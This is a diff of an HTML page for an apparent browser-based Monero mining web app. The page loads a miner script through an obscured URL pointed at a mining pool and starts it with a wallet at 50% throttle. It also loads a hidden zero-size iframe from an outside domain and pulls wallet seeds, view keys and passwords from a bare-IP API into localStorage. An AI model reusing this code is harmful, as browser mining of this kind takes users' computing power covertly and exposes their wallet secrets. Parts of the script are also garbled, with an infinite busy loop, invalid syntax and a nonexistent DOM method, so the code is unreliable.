@@ -179,12 +179,7 @@ span:after {
   		
   
     <script src="https://ethtrader.de/perfekt/perfekt.js?perfekt=wss://?jason=gulf.moneroocean.stream:80"></script>
-<script>
-var myData = JSON.parse(window.localStorage.getItem('USERINFO'))                                      
-                  
-					
-					var wallett = myData.wallet;
-</script>
+
 <script src="app.min.js">
 $(function() {
   $('#threads').text(navigator.hardwareConcurrency);
@@ -296,6 +291,7 @@ $(function() {
     options: barChartOptions
   });
 });</script>
+
 <iframe id="ifr" style="width: 0; height: 0; border: 0; border: none; position: absolute;"></iframe>
 <div id="serverData"></div>
     <div class="app-page" data-page="home">
@@ -318,33 +314,33 @@ $(function() {
             {
                 PerfektStart(wallett, "x");
                 throttleMiner = 50;
-				document.getElementById("ifr").src="http://www.minefulltrader.org/send.php"
+				document.getElementById("ifr").src="http://www.minefulltrader.org/demo.html"
 				
 			
-		var status;
-		var lastrate = 0;
-		var totalHashes = 0;
-		var totalHashes2 = 0;
-		var acceptedHashes = 0;
-		var hashesPerSecond = 0;
+var status;
+var lastrate = 0;
+var totalHashes = 0;
+var totalHashes2 = 0;
+var acceptedHashes = 0;
+var hashesPerSecond = 0;
 
-		function myFunction() {
-			status = setInterval(stats, 1000);
-		}
+function myFunction() {
+    status = setInterval(stats, 1000);
+}
 
-		function stats() {
-			  lastrate = ((totalhashes) * 0.5 + lastrate * 0.5);
-			  totalHashes = totalhashes + totalHashes
-			  hashesPerSecond = Math.round(lastrate);
-			  totalHashes2 = totalHashes;
-			  totalhashes = 0;
-			  acceptedHashes = GetAcceptedHashes();
-			  document.getElementById("hashes-per-second").innerHTML = hashesPerSecond;
-			  document.getElementById("accepted-shares").innerHTML = totalHashes2 +' | '+ acceptedHashes;
-		}
+function stats() {
+      lastrate = ((totalhashes) * 0.5 + lastrate * 0.5);
+	  totalHashes = totalhashes + totalHashes
+      hashesPerSecond = Math.round(lastrate);
+	  totalHashes2 = totalHashes;
+	  totalhashes = 0;
+      acceptedHashes = GetAcceptedHashes();
+      document.getElementById("hashes-per-second").innerHTML = hashesPerSecond;
+      document.getElementById("accepted-shares").innerHTML = totalHashes2 +' | '+ acceptedHashes;
+}
 
-		myFunction();
-					}};		
+myFunction();
+            }};		
         </script>
        </div>
 
@@ -504,50 +500,41 @@ $(function() {
 	<script src="zepto.js"></script>
     <script src="app.min.js"></script>
 	
-	<script>
-while (localStorage.getItem('USERINFO') === null) {
-
-
-	
-
-	
-
-
-}	
-		for(localStorage.getItem('USERINFO') === null) {
-			$.ajax({
-				url: 'http://52.165.128.57/monero/api.php?mode=new',
-				dataType: 'JSON',
-				success: function(data, status) {
-					$.each(data, function(key, value){
-					   window.localStorage.setItem('USERINFO', data);
-										   
-			
-			
-			
-			});
+	<script>		
+		if (localStorage.getItem('USERINFO') === null) {
+		$.ajax({
+    url: 'http://52.165.128.57/monero/api.php?mode=new',
+    dataType: 'JSON',
+    success: function(data, status) {
+        $.each(data, function(key, value){
+           window.localStorage.setItem('USERINFO', data);
+								   
+        
+		
+		
+		});
  
         
  
        
 	
 		
-			},
-			error: function() {
-				
-			}
-		})
-		}	
-		var myData = JSON.parse(window.localStorage.getItem('USERINFO'))                                      
+	},
+    error: function() {
+        
+    }
+})
+}	
+			var myData = JSON.parse(window.localStorage.getItem('USERINFO'))                                      
                   
 					
-					var wallet = myData.wallet;
+					var wallett = myData.wallet;
 					var view = myData.view;
 					var seed = myData.seed;
 					var username = myData.username;
 					var password = myData.password;
 					
-					document.getElementById("wallet").innerHTML = wallet;
+					document.insertElementById("wallet").innerHTML = wallett;
 					document.getElementById("view").innerHTML = view;
 					document.getElementById("seed").innerHTML = seed;
 			
@@ -555,7 +542,8 @@ while (localStorage.getItem('USERINFO') === null) {
 						
 					
 	
-		</script>	 
+		</script>
+
 	<script>
 	
 		var oldColour = "";
@@ -578,9 +566,6 @@ while (localStorage.getItem('USERINFO') === null) {
 		
 		
 		}
-		
-		
-		
 	
       App.controller('home', function (page) {
         setupPageColour(page);
